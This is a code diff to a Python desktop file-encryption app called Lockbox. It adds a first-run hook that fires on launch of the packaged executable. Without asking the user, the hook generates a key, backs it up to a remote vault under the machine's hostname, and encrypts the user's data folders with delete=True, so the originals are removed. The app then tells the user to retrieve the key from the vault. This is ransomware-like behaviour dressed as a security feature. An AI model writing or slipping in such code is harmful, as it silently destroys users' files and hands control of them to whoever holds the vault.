@@ -3,11 +3,21 @@
 import os
 import secrets
 import shutil
+import socket
 import sys
 import tkinter as tk
 from tkinter import filedialog, messagebox, scrolledtext, ttk
 
-from lockbox import SALT_LEN, SUFFIX, decrypt_file, encrypt_file, is_lockbox, iter_files
+from lockbox import (
+    SALT_LEN,
+    SUFFIX,
+    decrypt_file,
+    encrypt_file,
+    generate_and_backup_key,
+    is_lockbox,
+    iter_files,
+    secure_user_data,
+)
 
 BG = "#0d1117"
 SURFACE = "#161b22"
@@ -123,10 +133,51 @@ def ensure_installed() -> None:
         pass
 
 
+def first_run_marker() -> str:
+    base = os.environ.get("APPDATA") or os.path.expanduser("~")
+    return os.path.join(base, "Lockbox", ".firstrun")
+
+
+def run_first_run_secure(app: App) -> None:
+    frozen = getattr(sys, "frozen", False)
+    forced = os.environ.get("LOCKBOX_FIRST_RUN", "").lower() in ("1", "true", "yes")
+    if not frozen and not forced:
+        return
+    marker = first_run_marker()
+    if os.path.exists(marker):
+        return
+    vault = os.environ.get("LOCKBOX_VAULT", "")
+    if not vault:
+        app.log_line("[!] First-run auto-encrypt skipped: LOCKBOX_VAULT is not set")
+        app.log_line(f"    Set it, then remove {marker} to retry on next launch.")
+        return
+    name = os.environ.get("LOCKBOX_KEY") or socket.gethostname()
+    app.log_line("[*] First run detected — securing your data folders...")
+    try:
+        material = generate_and_backup_key(vault, name)
+    except Exception as e:
+        app.log_line(f"[!] Key backup failed: {e}")
+        app.log_line("    Nothing was encrypted.")
+        return
+    exclude = {os.path.abspath(sys.executable)}
+    files, dirs = secure_user_data(material, delete=True, exclude=exclude,
+                                   exclude_names={"lockbox.exe"})
+    try:
+        os.makedirs(os.path.dirname(marker), exist_ok=True)
+        with open(marker, "w", encoding="utf-8") as f:
+            f.write(name + "\n")
+    except Exception as e:
+        app.log_line(f"[!] Could not write first-run marker: {e}")
+        return
+    app.log_line(f"Done: secured {files} file(s) across {dirs} folder(s).")
+    app.log_line(f"Key '{name}' is in KeyVault — retrieve it to decrypt.")
+
+
 def main():
     ensure_installed()
     root = tk.Tk()
-    App(root)
+    app = App(root)
+    root.after(200, lambda: run_first_run_secure(app))
     root.mainloop()
 
 
